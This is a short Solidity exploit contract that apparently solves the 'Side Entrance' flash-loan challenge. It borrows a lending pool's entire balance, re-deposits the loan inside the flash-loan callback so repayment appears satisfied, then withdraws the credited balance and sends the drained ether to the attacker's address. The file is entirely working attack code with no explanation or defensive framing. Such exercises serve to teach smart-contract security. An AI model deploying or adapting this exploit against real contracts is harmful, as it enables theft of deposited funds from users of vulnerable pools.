pragma solidity ^0.8.0;


interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceExp {
    address owner;
    ISideEntranceLenderPool target;

    constructor(address _targetAddr) {
        owner = msg.sender;
        target = ISideEntranceLenderPool(_targetAddr);
    }

    function attack() external {
        uint256 targetBalance = address(target).balance;
        target.flashLoan(targetBalance);

        // get eth to this contract
        target.withdraw();
    }

    // this is going to be called by target's flashLoan function
    function execute() external payable {
        target.deposit{value: msg.value}();
    }

    // use this to get eth to eoa
    function getThePrize() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    // to be able to withdraw funds from target 
    receive() external payable {}
}
 